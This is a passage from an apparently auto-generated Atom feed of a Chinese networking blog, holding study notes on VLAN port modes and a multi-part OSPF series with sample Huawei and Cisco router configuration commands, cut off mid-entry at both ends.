      &lt;p&gt;信息安全的两次变革：第一次是计算机的诞生，许多重要文件存储于计算机中，因此，计算机的主机安全就成为了一个重要的问题。第二次是计算机网络及分布式系统的诞生，人们利用网络对数据传输，在这个复杂且庞大的网络中，如何去传输重要数据，这又给信息安全带来新的问题和挑战。随着这些问题的解决，密码学也在不断的发展中。信息安全的四个目标：保密性、完整性、可用性、合法使用。&lt;/p&gt;
    
    </summary>
    
      <category term="信息安全" scheme="http://soliym.top/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="密码学" scheme="http://soliym.top/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>vlan接口模式</title>
    <link href="http://soliym.top/2019/11/07/vlan%E6%8E%A5%E5%8F%A3%E6%A8%A1%E5%BC%8F/"/>
    <id>http://soliym.top/2019/11/07/vlan接口模式/</id>
    <published>2019-11-07T13:24:05.138Z</published>
    <updated>2019-12-24T08:47:58.730Z</updated>
    
    <content type="html"><![CDATA[<p>vlan三种接口模式区别：</p><a id="more"></a><h3 id="Access端口"><a href="#Access端口" class="headerlink" title="Access端口"></a>Access端口</h3><h4 id="1、收到数据包"><a href="#1、收到数据包" class="headerlink" title="1、收到数据包"></a>1、收到数据包</h4><p>收到一个数据包，判断是否有vlan信息，如果没有则打上端口的pvid，并进行交换转发</p><h4 id="2、发送数据包"><a href="#2、发送数据包" class="headerlink" title="2、发送数据包"></a>2、发送数据包</h4><p>将数据包的vlan信息剥离，直接发送出去</p><h3 id="Trunk端口"><a href="#Trunk端口" class="headerlink" title="Trunk端口"></a>Trunk端口</h3><h4 id="1、收到数据包-1"><a href="#1、收到数据包-1" class="headerlink" title="1、收到数据包"></a>1、收到数据包</h4><p>1）收到一个数据包，判断是否有vlan信息，如果没有则打上端口的pvid，并进行交换转发</p><p>2）如果有vlan信息，则判断该trunk端口是否容许该vlan数据包进入，容许转发，否则丢弃。</p><h4 id="2、发送数据包-1"><a href="#2、发送数据包-1" class="headerlink" title="2、发送数据包"></a>2、发送数据包</h4><p>比较端口的pvid和发送的vlan信息，如果相同则剥离vlan信息，然后发送，不相等，则直接发送。</p><h3 id="hybrid端口"><a href="#hybrid端口" class="headerlink" title="hybrid端口"></a>hybrid端口</h3><h4 id="1、收到数据包-2"><a href="#1、收到数据包-2" class="headerlink" title="1、收到数据包"></a>1、收到数据包</h4><p>1）没有vlan信息，则打上端口的pvid，然后交换转发</p><p>2）有vlan信息，则判断该端口是否容许该vlan的数据包进入</p><h4 id="2、发送数据包-2"><a href="#2、发送数据包-2" class="headerlink" title="2、发送数据包"></a>2、发送数据包</h4><p>判断该vlan的属性</p><p>1）untagged 剥离vlan tag，进行转发</p><p>2）tagged 直接发送</p><p>3）没有接口容许vlan，丢弃</p><p>注：交换机内部在处理数据包时，所有数据包一定是打上vlan tag的</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>1、tag报文是在原来以太网mac帧格式的基础上，在源mac和目的mac地址的后面加上4字节的vlan信息，组成802.1q帧，对于vlan信息PC网卡不能识别</p><p>2、access端口只能属于一个vlan</p><p>3、trunk端口可用于多个vlan通信</p><p>4、hybrid端口允许端个vlan通过，可以接受和发送多vlan报文</p><p>5、hybrid和trunk端口在处理数据报时，方法是一样的，不同在于，发送数据包，hybrid端口可以容许多个vlan数据包发送时不打标签，trunk端口只容许缺省vlan的数据包发送时不打标签</p><p>6、access端口只属于一个vlan，所以它的缺省vlan就是在所在vlan，hybrid和trunk端口属于多个vlan，他们的缺省vlan为vlan 1</p><p>7、如果设置了端口的缺省vlan id，当端口收到不带vlan tag的数据包之后，则将数据包转发到缺省vlan所在的交换机端口，当端口发送带有vlan tag的数据包时，如果数据包的vlan id与端口缺省vlan 相同，则交换机将去掉数据包携带的vlan tag，然后转发到该接口。</p><p>8、华为交换机的缺省vlan为pvid</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;vlan三种接口模式区别：&lt;/p&gt;
    
    </summary>
    
      <category term="CCNP/HCNP" scheme="http://soliym.top/categories/CCNP-HCNP/"/>
    
    
      <category term="HCNP" scheme="http://soliym.top/tags/HCNP/"/>
    
  </entry>
  
  <entry>
    <title>OSPF(三)</title>
    <link href="http://soliym.top/2019/09/23/OSPF(%E4%B8%89)/"/>
    <id>http://soliym.top/2019/09/23/OSPF(三)/</id>
    <published>2019-09-23T09:56:03.224Z</published>
    <updated>2019-09-23T09:57:49.065Z</updated>
    
    <content type="html"><![CDATA[<h5 id="10、过滤OSPF路由"><a href="#10、过滤OSPF路由" class="headerlink" title="10、过滤OSPF路由"></a>10、过滤OSPF路由</h5><p>利用OSPF的汇总，在汇总条目的同时要求ospf协议传递这些汇总路由来实现路由过滤—cisco、华为均可</p><a id="more"></a><p> ospf 1 router-id 4.4.4.4 </p><p> area 0.0.0.1 </p><p> abr-summary 192.168.1.144 255.255.255.248 not-advertise  该条路由将不能再传递—3类</p><p>[r6]ospf  1 </p><p>[r6-ospf-1]asbr-summary 192.168.1.132 255.255.255.252 not-advertise  拒绝7类的传递</p><p>注：此处所谓的汇总网络号，实际可以是具体的明细路由；</p><h5 id="11、OSPF不规则区域"><a href="#11、OSPF不规则区域" class="headerlink" title="11、OSPF不规则区域"></a>11、OSPF不规则区域</h5><p>（一）规则区域：星型结构—骨干区域位于中心，非骨干区域连接骨干区域</p><p>​                   —必须存在合法的ABR</p><p>该规则的意义在于减少LSA的更新量—星型结构稳定性较高，性价比好；</p><p>OSPF存在的条件：</p><p>1、直连的邻居间，区域ID必须相同，route-id不同，否则无法建立邻居关系—ABR-连接不同的区域。</p><p>2、一台ABR没有连接到骨干区域，则为不合法ABR，不能进行路由信息的共享。</p><p>3、合法的ABR上的区域间。可直接进行路由信息共享，无须经过骨干区域。</p><p>（二）不规则区域</p><p>1、没有连接到骨干的非骨干区域</p><p>2、不连续的骨干区域</p><p>（三）解决方法：</p><p>​       1）tunnel 隧道–GRE，一种简单的VPN</p><p>在两台的ABR上建立tunnel，然后将其宣告到OSPF协议中</p><p>配置：</p><p>interface Tunnel0/0/0</p><p> ip address 10.1.1.1 255.255.255.0 </p><p> tunnel-protocol gre</p><p> source 34.1.1.1</p><p>destination 45.1.1.2</p><p>缺点：</p><p>1、周期和触发的信息将对中间的穿越区域造成资源的占用；</p><p>2、选路不佳</p><p>​      2）OSPF-vlink 虚电路—网络中合法的ABR（工作的区域0的ABR），和非法ABR间建立一条虚链路（在OSPF协议中构建，没有新生网段）   由合法ABR授权非法ABR进行区域间路由共享</p><p>配置：</p><p> [r3]ospf 1 </p><p> [r3-ospf-1]area 1 </p><p> [r3-ospf-1-area-0.0.0.1]vlink-peer 5.5.5.5    此处5.5.5.5为对端ABR的router-id</p><p>优点：</p><p>没有新生链路，故选路正常    </p><p>缺点：</p><p>cisco设备中OSPF虚链路为避免对中间穿越区域周期保活和更新产生资源占用，取消了周期的hello包和周期更新；—- 不可靠，不稳定</p><p>华为设备中依然保留周期的hello包和更新—-占用中间区域资源</p><p>​          3）OSPF多进程双向重发布</p><p>OSPF多进程，进程号仅具有本地意义，邻居间建立邻居关系时可以使用不同的进程号；</p><p>若在一台设备上同时启动多个进程，那么不同进程存在自己的邻居关系，生成不同的数据库（不共享）；</p><p>最终将所有数据库计算所得路由加载于同一张路由表中；</p><p>在解决不规则区域时，可以让非法ABR将不同的OSPF区域工作在不同的OSPF进程中，之后使用双向重发布技术来实现路由共享；</p><p>配置：</p><p>[r2]ospf  1 </p><p>[r2-ospf-1]import-route  ospf  2 </p><p>[r2]ospf  2 </p><p>[r2-ospf-2]import-route  ospf  1</p><p>优点：1、选路正常    2、无周期信息   3、但依然可靠（触发更新、邻居关系周期保障）</p><h5 id="12、OSPF扩展知识"><a href="#12、OSPF扩展知识" class="headerlink" title="12、OSPF扩展知识"></a>12、OSPF扩展知识</h5><p>（一）附录E — link-id相同的问题</p><p>若一台ABR将两条3类LSA导入其他区域；同时这两条LSA的link-id会相同；</p><p>假设：短掩码网段先进入，link-id正常显示；长掩码进入时link-id加反掩码</p><p>20.1.0.0/16–link-id  20.1.0.0   </p><p>20.1.0.0/24–link-id  20.1.0.255   </p><p>若长掩码先进入，再短掩码进入时，长掩码的信息被刷新为反掩码；</p><p>link-id相同时，短掩码正常显示，长掩码加反掩码</p><p>（二）OSPF选路规则</p><p>1、AD（管理距离）无关的第一种情况：</p><p>r2(config)#router ospf 1 </p><p>r2(config-router)#distance 109 1.1.1.1 0.0.0.0</p><p>本地从RID为1.1.1.1的设备处学习到路由条目，管理距离修改109；</p><p>一台路由器从两个OSPF邻居处学习到了两条相同的路由时，仅比较度量值，不关注管理距离；因为仅针对一台邻居进行管理距离修改的结果是要么两台都被改，要么修改失败；-关注IOS版本—有时修改RID大路由器管理距离生效，有时需要修改RID小的设备；</p><p>2、AD（管理距离）无关的第二种情况 O  IA 3类</p><p>O IA 与 O IA路由相遇，到达相同目标的两条3类路由，这两条路由均通过非骨干传递，仅关注cost值，不关注管理距离；</p><p>若一条通过骨干区域传递，另一条同过非骨干区域传递–非骨干传递的路由无效</p><p>OSPF的水平分割：区域标号为A的3类LSA，不能回到区域A；</p><p>3、OE 与OE   E为5类    N 为7类   默认所有重发布进入路由条目均为类型2，类型2在路由表中cost值不会显示沿途的累加，仅显示起始度量；</p><p>①两条均为OE2或者均为N2，起始度量相同； 关注沿途的累加度量 （OE2路由在表中度量默认不显示内部度量，仅显示起始度量）</p><p>②两条均为OE2或者均为N2，起始度量不同；优先起始度量小的路径；</p><p>注：以上设计是便于管理员快速干涉选路；</p><p>4、OE1路由仅比较总度量（起始度量+沿途累加），仅修改起始度量不一定能干涉选路，必须在修改或使得总度量产生区别才能干涉选路；</p><p>拓扑优于路由   1/2LSA计算所得路由优于3/4/5/7类计算所得</p><p>内部优于外部   3类优于4/5/7类</p><p>类型1优于类型2  E1优于E2，N1优于N2，E1优于N2，N1优于E2；</p><p>E1与N1相遇，或E2与N2相遇，先比总度量（起始+沿途）小优；度量一致5类优于7类</p><p>5、FA-转发地址</p><p>正常OSPF区域收到的5类LSA不存在FA值；</p><p>产生FA的条件：</p><p>1、5类LSA —- 假设R9为ASBR，S0/0口工作的OSPF中，E0/0口工作在非ospf协议或不同ospf进程中；且S0/1也宣告在和S0/0相同的OSPF进程中，同时该接口的工作方式为广播型；</p><p>将在5类LSA中出现FA地址，地址为R9连接R10网段中R10的接口ip；R9与R10间运行的是EIGRP协议</p><p>意义在于让R9前端的OSPF设备(比如R8)，清楚的知道域外的下一跳拓扑结构，更好的避免环路；</p><p>2、7类LSA—必然出现FA地址</p><p>假设R9为ASBR，S0/0口工作的OSPF中，S0/1口工作在非ospf协议或不同进程中；</p><p>S0/1未运行OSPF–FA地址为R9上最后宣告的环回地址（个别IOS也可能是最大环回接口ip地址），若R9没有环回接口；FA地址为R9上最后宣告的物理接口地址（个别IOS也可能是最大的物理接口ip地址）</p><p>R9的S0/1也工作OSPF协议中，S0/1接口工作方式为广播，那么FA地址为R10接口ip；</p><p>S0/1的工作方式为点到点，那么FA地址为R9的s0/1口ip</p><p>切记：在FA地址出现后，4类LSA无效；人为过滤掉4类LSA，依然可达域外；</p><p>​      当4类LSA存在，却人为过滤了到达FA地址的路由，那么将无法访问域外；</p><p>​      一旦出现FA地址，所有的选路计算均基于FA地址进行；</p><p> 1、针对存在FA的5/7类路由，4类LSA无意义，仅递归到FA地址；若FA地址被策略过滤导致不可达；</p><p> 2、路由表中的度量是到FA地址的度量，不是到ASBR的度量；</p><p>6、NP位+E位   P位被加密，故抓包时看不见P位；</p><p>正常NSSA区域内的1类LSA中，N=1    E=0  标识该区域转发7类LSA，不转发5类</p><p>非NSSA区域E=1 N=0 标识可以转发5类，不能转发7类</p><p>P位为1，标识该区域将执行7类转5类；  P为0，不能7转5；</p><p>区域0连接到两个非骨干区域，这两个非骨干假设为区域1和区域2；区域1/2同时连接外部协议，且同时进行了重发布配置；区域1为NSSA区域，区域2为非NSSA区域；那么此时的区域1，P位=0不能进行7转5；故骨干区域只能收到从区域2来的外部路由；</p><p>若区域1和区域2均为NSSA区域，那么ABR的RID大区域进行7转5，另一个区域不转，</p><p>故骨干区域只能收到从一个区域传递的外部路由；</p><p>7、SFP算法 –OSPF防环机制</p><p>在同一个区域每台路由具有一致的LSDB</p><p>每台路由器以自己为根计算到达每个目标的最短路径（最小cost值）</p><p>必须区域划分–</p><p>优势-1）域间汇总减少路由条目数量</p><p>汇总路由是在所有明细路由均消失后才删除，网络更稳定</p><p>区域划分后不同类别的LSA传播范围不同，控制更新量</p><p>过程–基于本地LSDB(1/2类LSA)生成–生成有向图–基于有向图来进行最短路径树生成</p><p>最短路径树，关注本地LINK-ID的LSA开始–》基于该LSA内提及到点到点或传输网络信息再查看link-id递归到下一条信息；基于所有点到点和传输网络信息生成最短路径树主干；</p><p>然后用树中每台设备的末梢网络信息补充路由表，完成收敛</p><h5 id="13、OSPF的扩展配置"><a href="#13、OSPF的扩展配置" class="headerlink" title="13、OSPF的扩展配置"></a>13、OSPF的扩展配置</h5><p>1、认证—接口认证</p><p>[r3]interface GigabitEthernet 0/0/1   在直连邻居的接口上配置即可</p><p>[r3-GigabitEthernet0/0/1]ospf authentication-mode md5 1 cisco123   密文认证，key编号1，密码为cisco123，密码直接以MD5值传递；</p><p>2、被动接口 – 只接受不发送路由协议的信息，其他信息正常通过；华为成为沉默接口</p><p>[r3]ospf 1 </p><p>[r3-ospf-1]silent-interface GigabitEthernet 0/0/0</p><p>3、修改计时器—OSPF的hello time 为10或30s；dead time为hello 的4倍；</p><p>3类缺省 –》 配置特殊区域后自动生成  –  末梢、完全末梢、完全NSSA</p><p>5类缺省—》本地路由表中通过其他协议或OSPF的其他进程生成了缺省路由条目—前提</p><p>之后使用重发布机制将改条目重发布到ospf的协议中来；</p><p>[r4]ospf  1 </p><p>[r4-ospf-1]default-route-advertise</p><p>默认导入路由起始度量为1,类型2；</p><p>[r4-ospf-1]default-route-advertise type 1 cost 10  修改类型和起始度量</p><p>改小计时器可以加快收敛速度，但将增加对网络资源占用；故修改时不宜修改过小，维持原有的倍数关系；</p><p>[r3]interface GigabitEthernet 0/0/1</p><p>[r3-GigabitEthernet0/0/1]ospf timer hello 5  修改本端的hello time，本端的dead time自动4倍关系匹配；直连邻居间hello 和dead time必须完全一致，否则无法建立邻居关系；</p><p>缺省路由 –  3类的缺省        5类的缺省      7类缺省</p><p>若本地路由表中没有缺省条目，也可以让设备强制向内网发送一条5类缺省</p><p>[r4-ospf-1]default-route-advertise always  默认为类型2，cost值为1；</p><p>[r4-ospf-1]default-route-advertise always type 1 cost 10  修改类型和起源cost；</p><p>7类缺省：普通的NSSA区域将自动产生7类的LSA；也可在NSSA区域内手动生成出7类缺省</p><p>[r4]ospf  1 </p><p>[r4-ospf-1]area 1 </p><p>[r4-ospf-1-area-0.0.0.1]nssa default-route-advertise  默认为类型2 ，起始cost为1；</p><p>优选顺序：内部优于外部，类型1优于类型2；</p>]]></content>
    
    <summary type="html">
    
      &lt;h5 id=&quot;10、过滤OSPF路由&quot;&gt;&lt;a href=&quot;#10、过滤OSPF路由&quot; class=&quot;headerlink&quot; title=&quot;10、过滤OSPF路由&quot;&gt;&lt;/a&gt;10、过滤OSPF路由&lt;/h5&gt;&lt;p&gt;利用OSPF的汇总，在汇总条目的同时要求ospf协议传递这些汇总路由来实现路由过滤—cisco、华为均可&lt;/p&gt;
    
    </summary>
    
      <category term="CCNP/HCNP" scheme="http://soliym.top/categories/CCNP-HCNP/"/>
    
    
      <category term="OSPF" scheme="http://soliym.top/tags/OSPF/"/>
    
  </entry>
  
  <entry>
    <title>OSPF(二)</title>
    <link href="http://soliym.top/2019/09/19/OSPF(%E4%BA%8C)/"/>
    <id>http://soliym.top/2019/09/19/OSPF(二)/</id>
    <published>2019-09-19T09:46:51.653Z</published>
    <updated>2019-09-19T09:51:19.591Z</updated>
    
    <content type="html"><![CDATA[<h5 id="7、OSPF-从邻居建立成为邻接关系的条件"><a href="#7、OSPF-从邻居建立成为邻接关系的条件" class="headerlink" title="7、OSPF 从邻居建立成为邻接关系的条件"></a>7、OSPF 从邻居建立成为邻接关系的条件</h5><h6 id="1、网络类型"><a href="#1、网络类型" class="headerlink" title="1、网络类型"></a>1、网络类型</h6><p>基于接口网络类型来区别：</p><p>接口网络：判断网络类型，是基于设备接口的二层封装技术来进行的</p><a id="more"></a><p>点到点：在一个网段内只能存在两个节点，即便强制连接第三节点，最终也无法正常的通讯</p><p>​       串行链路上，二层封装为ppp或hdlc –没有物理寻址</p><p>MA：多路访问 –在一个网段内的节点数量不限制；</p><p>BMA： 广播型多路访问技术；在一个MA网络中同时存在广播机制；</p><p>​        二层封装技术为以太网；</p><p>NBMA：非广播型多路技术；在一个MA网络中没有广播机制；</p><p>​        二层封装技术为帧中继—串行链路   MGRE–点到点</p><p>在点到点网络中，OSPF协议正常均从邻居关系晋升为邻接关系；</p><p>在MA网络中，若所有邻居皆建立为邻接关系，将导致大量的重复更新；距离矢量路由协议在MA环境中使用了接口水平分割机制；由于OSPF协议是基于数据库同步对比的方式来进行收敛，故不支持接口的水平分割；</p><p>ospf最终将在MA网段进行DR/BDR的选举；非DR/BDR间将维持邻居关系，不建立邻接关系来避免重复更新；</p><h6 id="2、选举规则"><a href="#2、选举规则" class="headerlink" title="2、选举规则"></a>2、选举规则</h6><p>比较接口优先级  0-255 大优   </p><p> 默认点到点链路接口不行进行DR/BDR选举，故cisco 优先级为0-不参选  </p><p>MA网络中所有参选接口默认优选级为1，在优先级一致的情况必须参选设备的route-id数值大优；</p><p>干涉选举：修改参选接口的优先级</p><p>[r1-GigabitEthernet0/0/0]ospf dr-priority 2</p><p>因为选举非抢占，故修改优先级后，必须重启ospf协议进程</p><p><r1>reset ospf 1 process </r1></p><p>Warning: The OSPF process will be reset. Continue? [Y/N]:y</p><p>建议：网络存在DR/BDR后，其他设备修改为0，不参选；不需要重启设备的进程；</p><h6 id="8、OSPFlsa类型"><a href="#8、OSPFlsa类型" class="headerlink" title="8、OSPFlsa类型"></a>8、OSPFlsa类型</h6><p>1、OSPF的数据库表—LSDB 链路状态数据库</p><p>数据库表中装载OSPF的不同类型的LSA；</p><p>[r1]display  ospf lsdb  router   1.1.1.1     具体某条LSA</p><p>类别名   link-id</p><p>每条LSA均存在以下信息</p><p>  Type      : Router  类别名</p><p>  Ls id     : 1.1.1.1    link-id  在目录中番号</p><p>  Adv rtr   : 1.1.1.1    通告者的RID</p><p>  Ls age    : 532     老化时间 正常1800周期刷新，触发更新导致刷新；最大老化3609</p><p>  Len       : 60     长度</p><p>  Options   :  E      选项</p><p>  seq#      : 80000003   序列号</p><p>  chksum    : 0xb2ee     校验和码</p><p>OSPF的LSA是1800会更新一次序列号会加一</p><p>LSA的新旧比较</p><p>1、会先比较序列号，序列号越大越优，</p><p>2、如果序列号相同，会比较校验值（checksum)越大越优</p><p>3、如果校验值也相同，会比较LSA Age时间，是否等于MAX-age时间（3600）</p><p>4、如果age时间不等于max-age时间，会比较他们的差值，如果差值大15分钟（900秒），小的优</p><p>5、如果age时间不等于max-age时间，会比较他们的差值，如果差值小于15分钟，说明是同一条LSA，忽略其中一条</p><p>2、什么情况下LSA会更新：</p><p>1、1800到期会更新</p><p>2、触发更新（接口地址变化（增加，或删除），修改接口开销值，删除接口，或者删除通告）</p><p>[r4-ospf-1]import-route rip 1   将RIP进程1重发布到OSPF的进程1</p><p>[r5]display ospf lsdb ase originate-router  查看5类LSA</p><p>ASBR—自治系统边界路由器—协议边界路由器</p><p>3、LSA类型</p><p>LSA类别                 传播范围                         通告者                                    携带信息</p><p>LSA-1 router         本地设备所在区域     该区域每台设备的RID   每台设备本地所在区域的直连    拓扑</p><p>LSA-2 Network     本地设备所在区域                DR                     单个MA网段的拓扑</p><p>LSA-3 summary     整个OSPF域                       ABR                    域间路由</p><p>LSA-4 asbr             除ASBR所在的区域             ABR                   ASBR位置</p><p>​                              外的整个ospf域；               asbr                   所在区域基于1类交代位置</p><p>LSA-5 external      整个OSPF域                       ASBR                  域外路由</p><p>LSA-7 NSSA          本地的NSSA区域                ASBR                  域外路由</p><p>​                </p><p>LSA类别                    link-id                         通告者</p><p>LSA-1 router         通告者的RID                本区域内每台设备必须发送</p><p>LSA-2 Network      DR的接口ip地址          每个MA网段中的DR</p><p>LSA-3 summary     域间路由目标网络号     ABR，在经过下一台ABR时，修改为新的ABR的RID</p><p>LSA-4 asbr             ASBR的RID                 和ASBR同一区域的ABR，在经过下一台ABR时，修改为新的ABR的RID</p><p>LSA-5 external       域外路由目标网络号            ASBR</p><p>LSA-7 NSSA           域外路由目标网络号            ASBR；  离开本地NSSA区域时转换为5类</p><p>OSPF协议正常学习到的路由条目优先级为10；重发布进入的路由为150；</p><h6 id="9、LSA优化"><a href="#9、LSA优化" class="headerlink" title="9、LSA优化"></a>9、LSA优化</h6><p>优化OSPF协议，减少LSA的更新量；正常1类LSA是一台设备一条，2类lsa是一个网段的DR一条；3类和5类是一条路由一条LSA；4类是一台ASBR产生一条；</p><p>1、汇总—减少骨干区域的更新量</p><p>1）域间路由汇总—将非骨干区域汇总到骨干区域</p><p>在ABR上进行配置</p><p>[r1]ospf 1</p><p>[r1-ospf-1]area 2   只能汇总本地通过该区域1、2类LSA产生的路由</p><p>[r1-ospf-1-area-0.0.0.2]abr-summary 5.5.4.0 255.255.252.0 </p><p>注：汇总配置完成后，需要手工添加空接口防环路由</p><p>2）域外路由汇总；因为域外路由由ASBR重发布导入；故在导入的ASBR上进行配置</p><p>[r4]ospf 1</p><p>[r4-ospf-1]asbr-summary 99.1.0.0 255.255.252.0</p><p>2、特殊区域-减少非骨干区域的更新量—不能是骨干区域，不能存在的虚链路；</p><p>①不能存在ASBR</p><p>1、末梢区域 stub   拒绝4/5类的LSA；生成一条3类的缺省路由指向骨干区域</p><p>[r5]ospf 1   </p><p>[r5-ospf-1]area 2</p><p>[r5-ospf-1-area-0.0.0.2]stub</p><p>切记:该区域所有设备均需要定义为末梢区域；</p><p>2、完全末梢区域 在末梢区域的基础上，进一步拒绝3类lsa，仅保留一条3类的缺省；</p><p>先将该区域配置为末梢，区域然后仅在abr上定义完全即可；</p><p>[r1-ospf-1-area-0.0.0.2]stub no-summary</p><p>②存在ASBR</p><p>1、NSSA 非完全末梢区域—该区域拒绝其他区域的ASBR产生的4/5LSA；本地区域内ASBR产生的5类LSA，以7类在本区域传播，从本区域进入骨干区域时由ABR（新的ASBR）转换为5类，同时自动产生一条7的缺省指向骨干区域；</p><p>[r4]ospf</p><p>[r4-ospf-1]are 1</p><p>[r4-ospf-1-area-0.0.0.1]nssa  </p><p>本区域内所有设备均需配置</p><p>2、完全NSSA –在NSSA的基础上，进一步拒绝3的LSA；生成一条3类缺省指向骨干区域；</p><p>先将该区域配置为NSSA区域，然后仅在ABR上定义完全即可</p><p>[r3-ospf-1-area-0.0.0.1]nssa  no-summary</p><p>切记:考虑到ISP连接网络后，产生的缺省路由与OSPF特殊区域产生的缺省可能导致环路；</p><p>​     ISP连接到的哪个区域，那么该区域不能设定为任何的特殊区域；</p>]]></content>
    
    <summary type="html">
    
      &lt;h5 id=&quot;7、OSPF-从邻居建立成为邻接关系的条件&quot;&gt;&lt;a href=&quot;#7、OSPF-从邻居建立成为邻接关系的条件&quot; class=&quot;headerlink&quot; title=&quot;7、OSPF 从邻居建立成为邻接关系的条件&quot;&gt;&lt;/a&gt;7、OSPF 从邻居建立成为邻接关系的条件&lt;/h5&gt;&lt;h6 id=&quot;1、网络类型&quot;&gt;&lt;a href=&quot;#1、网络类型&quot; class=&quot;headerlink&quot; title=&quot;1、网络类型&quot;&gt;&lt;/a&gt;1、网络类型&lt;/h6&gt;&lt;p&gt;基于接口网络类型来区别：&lt;/p&gt;
&lt;p&gt;接口网络：判断网络类型，是基于设备接口的二层封装技术来进行的&lt;/p&gt;
    
    </summary>
    
      <category term="CCNP/HCNP" scheme="http://soliym.top/categories/CCNP-HCNP/"/>
    
    
      <category term="OSPF" scheme="http://soliym.top/tags/OSPF/"/>
    
  </entry>
  
  <entry>
    <title>OSPF(一)</title>
    <link href="http://soliym.top/2019/09/19/OSPF(%E4%B8%80)/"/>
    <id>http://soliym.top/2019/09/19/OSPF(一)/</id>
    <published>2019-09-19T09:40:53.475Z</published>
    <updated>2019-09-19T09:50:58.070Z</updated>
    
    <content type="html"><![CDATA[<h4 id="一、动态路由协议"><a href="#一、动态路由协议" class="headerlink" title="一、动态路由协议"></a>一、动态路由协议</h4><p>1、动态路由协议：直连路由间构建邻居关系，通过相互沟通学习路由信息，来获取未知的路由信息，然后根据不同的路由选择算法，计算到达未知网段的最佳路径，并将其加载到路由表中。</p><a id="more"></a><p>2、动态路由协议分类：</p><p>​                   1、基于AS将路由协议分为IGP和EGP</p><p>​                         AS-自治系统    </p><p>​                                   0-65535  标准为2个字节   扩展为4个字节</p><p>​                                                   1-64511          公有</p><p>​                                                    64512-65535 私有</p><p>​                         IGP—内部网关路由协议（as之内使用）</p><p>​                                   RIP/OSPF/EIGRP(Cisco)/isis</p><p>​                                 EGP—外部网关路由协议（as之间使用）</p><p>​                                    BGP/EGP</p><p>​                   2、内部网关路由协议—IGP分类</p><p>​                         ①更新时是否携带子网掩码：有类别—不携带</p><p>​                                                                     无类别—携带</p><p>​                         ②工作特点：距离适量—RIP/EIGRP</p><p>​                                                                基于路由条目收敛</p><p>​                                             链路状态—OSPF/ISIS</p><p>​                                                               基于LSA收敛</p><h4 id="二、开放式最短路径优先协议"><a href="#二、开放式最短路径优先协议" class="headerlink" title="二、开放式最短路径优先协议"></a>二、开放式最短路径优先协议</h4><h5 id="1、OSPF协议特点"><a href="#1、OSPF协议特点" class="headerlink" title="1、OSPF协议特点"></a>1、OSPF协议特点</h5><p>适用范围：IGP</p><p>类型：链路状态型动态路由协议</p><p>算法：SPF算法  </p><p>封装：基于IP封装，协议号为89—跨层封装</p><p>版本：OSPFV2—IPV4、OSPFV3—IPV6</p><p>更新方式：组播或单播—224.0.0.5/224.0.0.6</p><p>​                      触发更新/周期更新—周期更新时间是30min</p><p>区域划分：OSPF需要合理规划IP地址和区域划分</p><p>​                 —目的：减少lsa数量、减少lsa传播范围、减少对资源的消耗</p><p>​                 —原因：OSPF需要消耗大量的路由器资源</p><p>metric计算：OSPF使用cost计算metric</p><p>​                    cost=参考带宽/链路实际带宽</p><p>​                    每条路由信息的metric值=该条路径上每段链路的cost值的总和</p><p>router-id：在网络内唯一标识一台路由器</p><h5 id="2、区域划分"><a href="#2、区域划分" class="headerlink" title="2、区域划分"></a>2、区域划分</h5><p>​     1、区域内传拓扑：</p><p>​          —用于每台路由器计算到达所有未知路径的最短路径</p><p>​          —拓扑信息：路由器之间的连接关系</p><p>​    2、 区域间传路由：</p><p>​           —区域间传递计算完成的路由信息</p><p>​           —路由信息：包含的接口的路由信息</p><p>​     3、区域标识：使用十进制或类似于ip地址的32位二进制</p><p>​     4、区域划分：基于链路（接口）</p><p>​     5、区域类型：骨干区域</p><p>​                            —区域0，必须存在且唯一</p><p>​                                  非骨干区域</p><p>​                           —非0区域</p><p>​     6、 路由器的角色：        </p><p>​           —骨干路由器：一个路由器的所有接口都在area 0中</p><p>​            —非骨干路由器：一个路由器的所有接口都不在area 0 中</p><p>​            —ABR：区域边界路由器：能够产生3类LSA的路由器既有接口属于area 0 又有接口属        于非area 0</p><p>​            —ASBR：自治系统边界路由器，能够产生5类或7类LSA的路由器，连接ospf网络和非ospf网络，并且将非ospf引入到ospf网络中</p><p>​       7、区域划分规则</p><p>​          ①OSPF网络中必须存在并唯一的骨干区域（若OSPF仅仅存在一个区域可以为非0区域）</p><p>​          ②非骨干区域必须与骨干区域直接相连（非骨干不能非骨干直接相连）</p><p>​     8、不规则区域：1.不连续的0区域     2.非骨干没有挂靠在骨干区域之上</p><h5 id="3、OSPF数据报"><a href="#3、OSPF数据报" class="headerlink" title="3、OSPF数据报"></a>3、OSPF数据报</h5><p>   OSPF数据包跨层封装于三层报头</p><p><img src="file:///C:/Users/ASUS/AppData/Local/Packages/Microsoft.Office.OneNote_8wekyb3d8bbwe/TempState/msohtmlclip/clip_image001.png" alt="img"></p><p>五类数据报：</p><p>1、hello（224.0.0.5）：发现、建立、保活邻居关系、邻接关系</p><p>2、DBD-数据库描述包：本地链路状态数据库的目录</p><p>3、LSR-链路状态查询：根据DBD中的描述，对未知的lsa请求</p><p>4、LSU-链路状态更新：对请求的LSR的回复，携带lsa信息</p><p>5、LSACK-链路状态确认：确认包，保证lsa传递的可靠性</p><p>DBD：数据库描述数据包  使用隐式确认，分为两种：1.主从选举DBD-包含mtu，若不一致则停留在预启动   2.发送LSA头部摘要信息（LSA目录）</p><p>由于IP数据报不可靠，所以除hello外，其他数据包需要确认</p><p>DBD—序列号，显示或隐式确认</p><p>LSR—LSU</p><p>LSU—LSACK</p><h5 id="4、OSPF状态机"><a href="#4、OSPF状态机" class="headerlink" title="4、OSPF状态机"></a>4、OSPF状态机</h5><p>down：一旦收发hello，则进入下一状态</p><p>init—初始化：当接收到的hello中携带自己的router-id，则进入下一状态</p><p>2way—双发通信：邻居关系建立的标志</p><p>​             点到点网络直接进入下一状态，ma网路进行DR/BDR选举</p><p>​             条件匹配：若条件匹配成功，进入下一状态</p><p>​                              若条件匹配失败，停留在当前状态，依靠hello保活邻居关系</p><p>Exstart预启动:通过类hello包DBD进行主从关系选举，router-id大的为主，优先进入下一状态</p><p>​                 （通过主从选举确定先发送DBD的一方，确保传输的可靠性和对链路带宽的占用小）          如果mtu不相同则停留在该阶段</p><p>exchange准交换：使用真正的DBD包进行数据库目录的共享</p><p>loading 